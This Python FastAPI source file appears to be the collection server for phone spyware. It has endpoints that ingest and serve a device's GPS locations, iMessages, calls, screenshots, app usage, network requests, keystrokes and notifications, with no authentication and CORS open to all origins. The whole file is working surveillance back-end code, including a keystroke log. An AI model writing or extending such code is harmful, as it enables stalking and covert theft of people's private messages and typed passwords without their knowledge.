import os
import json
import time
import sqlite3
from pathlib import Path
from datetime import datetime
from contextlib import asynccontextmanager

from fastapi import FastAPI, File, UploadFile, Form
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import base64
from io import BytesIO

DB_DIR = Path("/tmp")
DB_PATH = DB_DIR / "monitor.db"
CAPTURES_DIR = DB_DIR / "captures"
CAPTURES_DIR.mkdir(parents=True, exist_ok=True)

def get_conn():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=OFF")
    return conn

def init_db():
    conn = get_conn()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude REAL NOT NULL,
            longitude REAL NOT NULL,
            altitude REAL DEFAULT 0,
            speed REAL DEFAULT 0,
            accuracy REAL DEFAULT 0,
            timestamp TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            text TEXT,
            sender TEXT,
            recipient TEXT,
            is_from_me INTEGER DEFAULT 0,
            service TEXT DEFAULT 'iMessage',
            timestamp TEXT
        );
        CREATE TABLE IF NOT EXISTS calls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            caller_id TEXT,
            duration INTEGER DEFAULT 0,
            call_type TEXT,
            timestamp TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS screen_captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            image_b64 TEXT,
            timestamp TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS app_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            app_name TEXT,
            bundle_id TEXT,
            duration INTEGER DEFAULT 0,
            timestamp TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS network_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            method TEXT,
            host TEXT,
            bytes_sent INTEGER DEFAULT 0,
            bytes_received INTEGER DEFAULT 0,
            timestamp TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            text TEXT,
            app_name TEXT,
            timestamp TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            app_name TEXT,
            title TEXT,
            body TEXT,
            timestamp TEXT DEFAULT (datetime('now'))
        );
    """)
    conn.commit()
    conn.close()

@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    yield

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def query(sql, params=()):
    conn = get_conn()
    rows = conn.execute(sql, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]

def execute(sql, params=()):
    conn = get_conn()
    conn.execute(sql, params)
    conn.commit()
    conn.close()

# --- GET endpoints ---

@app.get("/api/summary")
async def summary():
    today = datetime.now().strftime("%Y-%m-%d")
    return {
        "messages_count": query("SELECT COUNT(*) as c FROM messages WHERE date(timestamp)=?", (today,))[0]["c"],
        "calls_count": query("SELECT COUNT(*) as c FROM calls WHERE date(timestamp)=?", (today,))[0]["c"],
        "locations_count": query("SELECT COUNT(*) as c FROM locations WHERE date(timestamp)=?", (today,))[0]["c"],
        "captures_count": query("SELECT COUNT(*) as c FROM screen_captures WHERE date(timestamp)=?", (today,))[0]["c"],
        "apps_used": query("SELECT COUNT(DISTINCT app_name) as c FROM app_usage WHERE date(timestamp)=?", (today,))[0]["c"],
        "keystrokes_count": query("SELECT COUNT(*) as c FROM keystrokes WHERE date(timestamp)=?", (today,))[0]["c"],
        "network_requests": query("SELECT COUNT(*) as c FROM network_log WHERE date(timestamp)=?", (today,))[0]["c"],
        "latest_location": query("SELECT latitude, longitude FROM locations ORDER BY timestamp DESC LIMIT 1")[0] if query("SELECT 1 FROM locations LIMIT 1") else None,
    }

@app.get("/api/locations")
async def get_locations(limit: int = 100):
    return query("SELECT * FROM locations ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/messages")
async def get_messages(limit: int = 100):
    return query("SELECT * FROM messages ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/calls")
async def get_calls(limit: int = 50):
    return query("SELECT * FROM calls ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/app_usage")
async def get_app_usage(limit: int = 100):
    return query("SELECT * FROM app_usage ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/screen_captures")
async def get_screen_captures(limit: int = 50):
    return query("SELECT * FROM screen_captures ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/network_log")
async def get_network_log(limit: int = 100):
    return query("SELECT * FROM network_log ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/keystrokes")
async def get_keystrokes(limit: int = 100):
    return query("SELECT * FROM keystrokes ORDER BY timestamp DESC LIMIT ?", (limit,))

@app.get("/api/notifications")
async def get_notifications(limit: int = 100):
    return query("SELECT * FROM notifications ORDER BY timestamp DESC LIMIT ?", (limit,))

# --- POST ingestion endpoints ---

@app.post("/api/ingest/location")
async def ingest_location(latitude: float = Form(...), longitude: float = Form(...),
                          altitude: float = Form(0), speed: float = Form(0),
                          accuracy: float = Form(0)):
    execute("INSERT INTO locations (latitude, longitude, altitude, speed, accuracy) VALUES (?, ?, ?, ?, ?)",
            (latitude, longitude, altitude, speed, accuracy))
    return {"ok": True}

@app.post("/api/ingest/message")
async def ingest_message(text: str = Form(""), sender: str = Form(""),
                         recipient: str = Form(""), is_from_me: int = Form(0),
                         service: str = Form("iMessage"), timestamp: str = Form(None)):
    execute("INSERT INTO messages (text, sender, recipient, is_from_me, service, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
            (text, sender, recipient, is_from_me, service, timestamp or datetime.now().isoformat()))
    return {"ok": True}

@app.post("/api/ingest/call")
async def ingest_call(caller_id: str = Form(""), duration: int = Form(0),
                      call_type: str = Form("missed")):
    execute("INSERT INTO calls (caller_id, duration, call_type) VALUES (?, ?, ?)",
            (caller_id, duration, call_type))
    return {"ok": True}

@app.post("/api/ingest/screen_capture")
async def ingest_screen_capture(file: UploadFile = File(...)):
    content = await file.read()
    b64 = base64.b64encode(content).decode()
    execute("INSERT INTO screen_captures (image_b64) VALUES (?)", (b64,))
    return {"ok": True}

@app.post("/api/ingest/app_usage")
async def ingest_app_usage(app_name: str = Form(...), bundle_id: str = Form(""),
                           duration: int = Form(0)):
    execute("INSERT INTO app_usage (app_name, bundle_id, duration) VALUES (?, ?, ?)",
            (app_name, bundle_id, duration))
    return {"ok": True}

@app.post("/api/ingest/network")
async def ingest_network(url: str = Form(""), method: str = Form("GET"),
                         host: str = Form(""), bytes_sent: int = Form(0),
                         bytes_received: int = Form(0)):
    execute("INSERT INTO network_log (url, method, host, bytes_sent, bytes_received) VALUES (?, ?, ?, ?, ?)",
            (url, method, host, bytes_sent, bytes_received))
    return {"ok": True}

@app.post("/api/ingest/keystroke")
async def ingest_keystroke(text: str = Form(...), app_name: str = Form("")):
    execute("INSERT INTO keystrokes (text, app_name) VALUES (?, ?)", (text, app_name))
    return {"ok": True}

@app.post("/api/ingest/notification")
async def ingest_notification(app_name: str = Form(""), title: str = Form(""),
                              body: str = Form("")):
    execute("INSERT INTO notifications (app_name, title, body) VALUES (?, ?, ?)",
            (app_name, title, body))
    return {"ok": True}

@app.get("/api/health")
async def health():
    return {"status": "ok", "time": datetime.now().isoformat()}
